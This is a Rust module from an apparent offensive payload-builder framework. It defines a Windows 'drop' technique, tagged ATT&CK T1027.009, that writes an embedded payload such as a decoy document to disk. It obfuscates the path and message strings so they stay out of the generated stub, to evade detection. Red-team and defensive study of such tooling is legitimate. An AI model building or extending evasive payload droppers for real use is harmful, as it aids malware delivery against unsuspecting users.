//! Drop.
//!
//! Writes an embedded `format: plain` payload to a path on the host, before the
//! payload runs. A Preparation technique: it never runs the payload. See
//! `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for the drop technique.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Params {
    /// Destination path. `%NAME%` is expanded from the environment at run time,
    /// and a relative path is resolved against the process's working directory.
    /// Rebuilt at runtime through `StringsConfig`.
    #[serde(default)]
    pub path: String,

    /// Name of a `build.payloads` entry with `format: plain`. Required.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub payload: Option<String>,
}

/// Static metadata for the drop technique.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "drop",
    attck: &["T1027.009"],
    stability: Stability::Experimental,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Preparation,
    doc_path: "src/techniques/drop/README.md",
    readme: include_str!("README.md"),
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[],
    requires_indirect_syscalls: false,
    params_example: "technique: drop\nparams:\n  path: \"TEST.docx\"\n  payload: decoy_doc\n",
    // The write is standard-library file I/O; no Nt* call and no import.
    syscalls: &[],
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs. `render_fragment` rebuilds each at runtime through `StringsConfig`, so
/// no diagnostic text lands in the generated stub.
const MESSAGES: &[(&str, &str)] = &[(
    "$MSG_DROP_WRITE_FAILED$",
    "could not write the dropped file",
)];

impl Params {
    /// Renders the drop stub fragment for these parameters.
    ///
    /// The destination path goes through `strings`, so it never lands in
    /// cleartext in the generated stub. The embedded asset is injected by the
    /// engine (the `asset_bytes()` helper), not here.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let mut fragment = DEF.stub_fragment.replace(
            "$DROP_PATH_DEF$",
            &strings.obfuscate(&self.path).render_stub_expr("drop_path"),
        );
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            fragment = fragment.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("drop_msg_{index}")),
            );
        }
        fragment
    }
}

#[cfg(test)]
mod tests;
